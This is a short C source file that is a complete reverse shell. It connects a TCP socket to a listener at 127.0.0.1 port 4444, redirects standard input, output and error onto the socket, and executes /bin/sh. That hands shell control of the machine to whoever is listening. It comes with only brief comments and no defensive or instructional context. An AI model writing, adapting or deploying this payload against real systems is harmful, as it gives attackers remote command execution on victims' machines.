#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {
    // Declare variables
    int sockfd;
    struct sockaddr_in serv_addr;
    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    // IP address family
    serv_addr.sin_family = AF_INET;
    // Destination IP address
    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    // Destination port 
    serv_addr.sin_port = htons(4444);
    // Reverse connect to target IP address
    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    // Duplicate file descriptors for STDIN, STDOUT and STDERR 
    int i;
    for (i=0; i <= 2; i++){
        dup2(sockfd, i);
    }
    // Execute /bin/sh using execve  
    char *argv[] = {"/bin/sh", NULL};
    execve(argv[0], argv, NULL);
}
